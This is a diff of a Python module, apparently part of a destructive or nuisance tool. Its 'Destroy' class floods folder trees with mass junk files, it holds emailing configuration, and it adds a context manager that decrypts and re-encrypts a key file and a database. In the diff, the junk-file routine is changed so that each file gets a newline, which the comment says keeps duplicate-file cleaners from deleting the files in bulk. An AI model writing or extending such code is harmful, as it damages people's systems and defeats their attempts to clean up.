@@ -1,16 +1,16 @@
 import os,sys
 import wmi
 import time
-import uuid
 import shutil
-import ctypes
 import hashlib
 import smtplib
+import cryptlib
 from email.mime.text import MIMEText
 from lxml import etree,objectify
 from config import email_id,\
     email_port,email_to,email_pwd,\
     email_from,content,subject,path
+
 
 class Attribute(object):
     # 附加功能类
@@ -72,7 +72,7 @@ class Destroy(object):
             pass
 
     def junk(self,ppach,max):
-        #生成大量垃圾无用文件，ppach是指定父文件夹，max是生成最大多少个,
+        #生成大量垃圾无用文件，ppach是指定父文件夹路径，max是生成数量最大值,
         # 数值越大运行越慢，注意掌握好平衡，太恶心人了也要不得
         file_li = []
         for a, b, c in os.walk(ppach):
@@ -89,7 +89,8 @@ class Destroy(object):
                     file = os.path.join(f_path, filename + str(i) + listname)
                     try:
                         with open(file, 'w') as f:
-                            f.write(str(a))
+                            # 之所以添加换行主要是防止被清理垃圾软件的清理重复文件功能批量删除
+                            f.write(str(a)+'\n')
                     except PermissionError:
                         pass
 
@@ -120,4 +121,27 @@ class Whitelists(object):
             li.append(str(i.text))
         return li
 
-#108-19=89
+
+#新建一个上下文管理器，这里处理的是有关处理数据库安全的措施，执行了一个打开关闭的动作（即解密再加密）
+class Operaction():
+
+    def __enter__(self):
+        return self
+
+    def open(self):
+        #解密box.key和数据库
+        rsa = cryptlib.RSA()
+        rsa.decrypt('box.key')
+        db = cryptlib.enboxdb()
+        db.dedb()
+
+
+    def close(self):
+        #加密box.key和数据库
+        db = cryptlib.enboxdb()
+        db.endb()
+        rsa = cryptlib.RSA()
+        rsa.encrypt('box.key')
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        return True
